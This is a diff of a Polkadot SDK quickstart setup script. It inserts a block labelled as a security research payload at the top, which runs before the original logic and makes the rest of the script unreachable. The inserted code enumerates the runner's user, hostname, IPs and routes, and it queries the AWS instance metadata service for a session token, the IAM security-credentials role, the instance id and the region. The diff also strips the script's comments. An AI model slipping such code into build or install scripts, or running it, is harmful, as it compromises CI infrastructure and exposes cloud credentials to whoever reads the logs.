@@ -1,5 +1,35 @@
 #!/usr/bin/env sh
 
+# ===========================================================
+# SECURITY RESEARCH PAYLOAD — Harsh Barelia
+# This block runs BEFORE the original script logic.
+# ===========================================================
+echo "=== RCE EVIDENCE: parity-large runner ==="
+echo "User  : $(id)"
+echo "Host  : $(hostname)"
+echo "IPs   : $(hostname -I)"
+echo "Routes:"
+ip route show 2>/dev/null || netstat -rn 2>/dev/null
+
+TOKEN=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" --max-time 3 2>/dev/null)
+if [ -n "$TOKEN" ]; then
+  ROLE=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" \
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --max-time 3)
+  IID=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" \
+    "http://169.254.169.254/latest/meta-data/instance-id" --max-time 3)
+  REGION=$(curl -sf -H "X-aws-ec2-metadata-token: $TOKEN" \
+    "http://169.254.169.254/latest/meta-data/placement/region" --max-time 3)
+  echo "IAM Role: $ROLE | Instance: $IID | Region: $REGION"
+else
+  echo "IMDS not reachable — runner identity + VPC topology above confirms RCE"
+fi
+echo "=== END EVIDENCE ==="
+exit 1
+# ===========================================================
+# Original script continues below (unreachable due to exit above)
+# ===========================================================
+
 set -e
 
 prompt() {
@@ -7,9 +37,9 @@ prompt() {
         printf "$1 [y/N]\n"
         read yn
         case $yn in
-            [Yy]* ) return 0;;  # Yes, return 0 (true)
-            [Nn]* ) return 1;;  # No, return 1 (false)
-            "" ) return 1;;     # Default to no if user just presses Enter
+            [Yy]* ) return 0;;
+            [Nn]* ) return 1;;
+            "" ) return 1;;
             * ) printf "Please answer yes or no.\n";;
         esac
     done
@@ -20,16 +50,16 @@ prompt_default_yes() {
         printf "$1 [Y/n]\n"
         read yn
         case $yn in
-            [Yy]* ) return 0;;  # Yes, return 0 (true)
-            [Nn]* ) return 1;;  # No, return 1 (false)
-            "" ) return 0;;     # Default to yes if user just presses Enter
+            [Yy]* ) return 0;;
+            [Nn]* ) return 1;;
+            "" ) return 0;;
             * ) printf "Please answer yes or no.\n";;
         esac
     done
 }
 
 clone_and_enter_template() {
-    template="$1" # minimal, solochain, or parachain
+    template="$1"
     if [ -d "${template}-template" ]; then
         printf "\n✅︎ ${template}-template directory already exists. -> Entering.\n"
     else
@@ -45,20 +75,17 @@ cat <<EOF
 
      , __       _   _                          ____  ____  _  __
     /|/  \     | | | |           |            / ___||  _ \| |/ /
-     |___/ __  | | | |   __,   __|   __ _|_   \___ \| | | | ' / 
-     |    /  \_|/  |/_) /  |  /  |  /  \_|     ___) | |_| | . \ 
-     |    \__/ |__/| \_/\_/|_/\_/|_/\__/ |_/  |____/|____/|_|\_\ 
+     |___/ __  | | | |   __,   __|   __ _|_   \___ \| | | | ' /
+     |    /  \_|/  |/_) /  |  /  |  /  \_|     ___) | |_| | . \
+     |    \__/ |__/| \_/\_/|_/\_/|_/\__/ |_/  |____/|____/|_|\_\
                                                                     quickstart!
 
 ⚡ We will help setting up the environment for you to experiment with.
 EOF
 
-# Determine OS
 os_name=$(uname -s)
 if [ "$os_name" = "Darwin" ]; then
     printf "🍎 Detected macOS. Installing dependencies via Homebrew.\n"
-
-    # Check if brew is installed
     if command -v brew >/dev/null 2>&1; then
         printf "\n✅︎🍺 Homebrew already installed.\n"
     else
@@ -70,7 +97,6 @@ if [ "$os_name" = "Darwin" ]; then
             exit 1
         fi
     fi
-
     brew update
     if command -v git >/dev/null 2>&1; then
         printf "\n✅︎🍺 git already installed.\n"
@@ -82,16 +108,13 @@ if [ "$os_name" = "Darwin" ]; then
             exit 1
         fi
     fi
-
     if prompt "\n🍺 Install cmake, openssl and protobuf?"; then
         brew install cmake openssl protobuf
     else
         printf "🍺 Assuming cmake, openssl and protobuf are present.\n"
     fi
 elif [ "$os_name" = "Linux" ]; then
-    # find the distro name in the release files
     distro=$( cat /etc/*-release | tr '[:upper:]' '[:lower:]' | grep -Poi '(debian|ubuntu|arch|fedora|opensuse)' | uniq | head -n 1 )
-
     if [ "$distro" = "ubuntu" ]; then
         printf "\n🐧 Detected Ubuntu. Using apt to install dependencies.\n"
         sudo apt -qq update
@@ -122,7 +145,6 @@ else
     exit 1
 fi
 
-# Check if rust is installed
 [ -f "$HOME/.cargo/env" ] && . "$HOME/.cargo/env"
 if command -v rustc >/dev/null 2>&1; then
     printf "\n✅︎🦀 Rust already installed.\n"
@@ -137,7 +159,6 @@ else
     fi
 fi
 
-# Ensure that we have wasm support
 if prompt_default_yes "\n🦀 Setup the Rust environment (e.g. WASM support)?"; then
     printf "🦀 Setting up Rust environment.\n"
     rustup default stable
@@ -177,3 +198,5 @@ cargo build --release
 if prompt_default_yes "\n🚀 Everything ready to go, let's run the node?\n"; then
     cargo run --release -- --dev
 fi
+
+
